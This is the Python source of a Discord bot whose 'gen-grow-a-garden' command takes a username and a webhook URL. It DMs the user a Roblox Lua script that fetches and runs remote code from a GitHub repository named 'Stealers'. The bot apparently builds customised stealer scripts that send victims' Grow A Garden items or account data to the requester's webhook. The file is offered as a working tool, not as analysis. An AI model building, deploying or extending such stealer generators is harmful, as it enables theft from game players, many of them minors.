# ye
import discord
from discord import app_commands
from discord.ext import commands
import os

TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = False
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    try:
        synced = await tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

@tree.command(name="gen-grow-a-garden", description="Generate a Grow A Garden message")
@app_commands.describe(username="Your username", webhook="Your webhook URL")
async def gen(interaction: discord.Interaction, username: str, webhook: str):
    try:
        await interaction.response.send_message("DM sent!", ephemeral=True)
        embed = discord.Embed(
            title="Grow A Garden Generator",
            description=f"Hello {interaction.user.mention}! Here's your generated Grow A Garden script.",
            color=0x00ff00
        )
        embed.add_field(name="Username", value=username, inline=False)
        embed.add_field(name="Webhook", value=webhook, inline=False)
        embed.add_field(name="Script", value=f"""```lua
Username = "{username}"
Webhook = "{webhook}"
loadstring(game:HttpGet("https://raw.githubusercontent.com/Narukisora/Stealers/refs/heads/main/Http"))()
```""", inline=False)

        await interaction.user.send(embed=embed)
    except discord.Forbidden:
        await interaction.followup.send("Could not send DM. Please check your privacy settings.", ephemeral=True)

bot.run(TOKEN)
